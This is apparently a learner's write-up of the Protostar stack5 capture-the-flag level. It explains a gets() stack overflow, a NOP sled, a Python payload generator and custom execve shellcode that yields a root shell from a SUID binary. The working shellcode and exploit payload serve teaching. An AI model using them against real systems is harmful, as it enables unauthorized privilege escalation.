# For stack5 in protostar


>Stack5 is a standard buffer overflow, this time introducing shellcode.
>  
>This level is at /opt/protostar/bin/stack5
>  
>Hints
>  
> - At this point in time, it might be easier to use someone elses shellcode
> - If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
> - remove the int3s once your shellcode is done.

Our goal is to get a shell as `root`. Before reading my diary on this challenge, if you are a beginner, I highly recommend you watch [this video by LiveOverflow](https://www.youtube.com/watch?v=HSlhY4Uy8SA).

We are given the following C program
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

The vulnerability in this program is starkingly obvious. `gets` reads everything we give it into the `buffer` with no regards to whether the buffer will overflow.

We will smash the stack and overwrite the return address to whereever we want to execute to. Hold on a minute. What exactly is there for us to return to that will give us a shell? Nothing. We have to create it our own in the stack. Fret not, `readelf -l stack5` reveals that the stack is executable: `  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4`. That means we can create a shellcode there. We will overwrite the return address with the address of our shellcode in the stack.

This is the format of our shellcode:
`< shellcode > < padding > < addr of shellcode >`.

### Problem: Inconsistent addresses  (╯°□°）╯︵ ┻━┻

After loading up `stack5` in `gdb`, I found that the return address was stored at address `0xbffff6ac`. `gets` read input to address `0xbffff660`. We will be using `INT 0x3` as our "exploit" first, just to make sure that the program will return to our shellcode. If it does, we should expect `Program received signal SIGTRAP, Trace/breakpoint trap.`.

This is our first exploit code: `\xcc\xcc\xcc\xcc\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x60\xf6\xff\xbf`.

In GDB, we get the output as expected.
```
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
```

However, in the command line, we get a segmentation fault! Why? (ง •̀_•́)ง
```
user@protostar:/opt/protostar/bin$ cat /home/user/input\ stack5 | ./stack5
Segmentation fault
```

Segmentation fault means some memory that is not supposed to be accessed is being accessed. The program is not executing as expected.

[According to LiveOverflow](https://www.youtube.com/watch?v=HSlhY4Uy8SA&t=381), one possible reason is that different environment variable lengths cause the stack address to be different. Since the stack address changes, both the addresses that `gets` reads to and that `main` returns to are different. That is why `INT 0x3` was never executed! Since something else instead of `INT 0x3` was in address `0xbffff600` in terminal 2, we got a segfault.

| GDB in terminal 1 | GDB in terminal 2|
|---|---|
|0xbffff600|0xbffff680|

Ok, one way we can solve this is to update our shellcode to return to `0xbffff680` in terminal 2. But how do we know for sure that when we run the program again, the address won't be different? We do not know what the exact address is.

### The solution: Nop Nop Nop ┬──┬◡ﾉ(° -°ﾉ)

>The technique sees common usage in software exploits, where it is used to direct program execution when a branch instruction target is not known precisely.
[source](https://en.wikipedia.org/wiki/NOP_slide)


Let me introduce our new best friend, the NOP sled. We do not know what the exact address that `gets` will read our shellcode into, but we know the range roughly. So we put several `\x90` instructions in the area preceeding the shellcode. That way even though the stack address may change, `main` would still return hopefully to one of those `\x90` instructions and slide down to our shellcode.

This is the format of our new shellcode:
` < padding > < addr to somewhere in the nop sled > < nop sled > < shellcode > `.

I do not want our nop sled and shellcode to be limited to 76 bytes, so I shift it to after the return address. That way, the nop sled can be very long if it has to be.

Following LiveOverflow's example, I decided to create a Python script to print my shellcode too, to make life easier for me.
```                                                       
PADDING_LENGTH = 76


padding = ""

for i in range(PADDING_LENGTH):
        padding += "\x90"

addr_of_shellcode="\x40\xfa\xff\xbf"

shellcode = ""
for i in range(1000):
        shellcode+="\x90"

shellcode += "\xcc\xcc\xcc\xcc"

print padding + addr_of_shellcode + shellcode
```

When we execute this, in `gdb` or in the command line, we get the `Program received signal SIGTRAP, Trace/breakpoint trap` output. I admit, it was not that simple. I had to change several times the length of the NOP sled and the return address to what I guess should point roughly in the middle of the NOP sled  before it worked. Receiving segfault error is normal before success. In fact, I got segfault so many times I gave up and spammed 1000 `\x90` instructions before I got the desired SIGTRAP error.

(Just a note though, a segfault *is still possible* as we could overflow the entire stack with our input of 1080 characters.

For example, `info proc mappings` shows `0xbffeb000 0xc0000000    0x15000          0           [stack]`, meaning that the stack is from address `0xbffeb00` to address `0xc0000000`. If `gets` reads into address say `0xbffffce0`, only a maximum of 0x320 (800) characters can be accomodated.)


Since the shellcode is working, I'll change it to spawn us a new shell. I decided to make my own shellcode instead of using existing ones, but both achieve the same goal - to call `execve('/bin//sh')`.
```
xor eax, eax
mov al, 0xb
push 0x00
push 0x68732f2f 
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
```

Instead of `\xcc\xcc\xcc\xcc`, we now use `shellcode += "\x31\xC0\xB0\x0B\x6A\x00\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xCD\x80"`.

Testing in GDB, we get:
```
(gdb) 
Executing new program: /bin/dash

Program exited normally.
```
It means we have successfully executed `/bin/sh` which is a link to `/bin/dash`.

Running it in command line, we get:
```
user@protostar:/opt/protostar/bin$ cat /home/user/input\ stack5 - | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```

Success. Wait a minute! We ran `stack5` as `user`! Why does simply spawning a shell give us root? 

>The real and effective UID and GID of the child process are equal to the real and effective UID and GID of the parent process. Therefore, when the child process calls exec those values are not modified.
[source](https://stackoverflow.com/questions/17785983/ruid-euid-after-exec)

Here's why. `-rwsr-xr-x 1 root root 22612 Nov 24  2011 stack5` shows that `stack5` is a SETUID program. That means the EUID of the process is `root` instead of `user`. As the quote above states and the output proves, the EUID of the shell process is *also* `root`. This is why exploit-exercises recommends solving Nebula challenges before coming to Protostar.

We have escalated our privileges and understood the concept behind it. ᕕ( ᐛ )ᕗ 

END


